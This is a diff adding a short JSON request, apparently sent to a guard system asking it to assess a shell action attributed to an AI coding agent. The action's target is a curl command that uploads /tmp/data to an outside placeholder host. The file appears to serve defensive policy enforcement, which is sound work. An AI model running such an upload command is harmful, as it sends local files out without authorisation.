@@ -1,0 +1,11 @@
+{
+  "op": "assess",
+  "schema_version": "sir.advisory_request.v0",
+  "action": "shell_exec",
+  "target": "curl https://unknown.example/upload -F file=@/tmp/data",
+  "resolved_actor": "ai_coding_agent",
+  "attribution_confidence": "medium",
+  "taint": [],
+  "enforceability": "enforces",
+  "mode": "guard"
+}
